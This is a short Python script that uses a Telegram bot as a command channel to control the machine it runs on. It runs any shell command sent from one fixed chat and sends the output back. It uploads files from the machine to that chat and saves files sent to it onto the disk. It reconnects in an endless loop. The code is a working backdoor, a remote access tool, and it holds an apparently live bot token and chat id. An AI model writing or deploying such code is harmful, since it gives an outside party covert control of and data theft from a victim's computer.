from telebot import TeleBot
from os import chdir
from subprocess import check_output
from time import sleep

bot = TeleBot('6114413485:AAHKBapgn6Mv7LtYQXi5bHsB3pLgc9zFyhA')


def send(text):
    bot.send_message(1222961630, text)


@bot.message_handler(commands=['start'])
def start(msg):
    if msg.chat.id != 1222961630:
        bot.send_message(msg.chat.id, 'error')
    else:
        send('/cmd ...\n/download ...\nsend file to upload it')


@bot.message_handler(commands=['cmd'])
def cmd(msg):
    cmd = msg.text[5:]

    if cmd.startswith('cd '):
        try:
            chdir(cmd[3:])
            send('ok')
        except Exception as e:
            send(e)
    else:
        try:
            out = check_output(cmd, shell=True).decode('cp866')

            if len(out) > 4095:
                for i in range(0, len(out), 4095):
                    send(out[i:i+4095])
            elif len(out) == 0:
                send('ok')
            else:
                send(out)
        except Exception as e:
            send(e)


@bot.message_handler(commands=['download'])
def download(msg):
    try:
        bot.send_document(1222961630, document=open(msg.text[10:]))
    except Exception as e:
            send(e)


@bot.message_handler(content_types=['document'])
def upload(message):
    try:
        file_id = message.document.file_id
        file_name = message.document.file_name
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)
        send('ok')
    except Exception as e:
        send(e)


while True:
    try:
        send('bot started')
        bot.polling()
    except:
        sleep(5)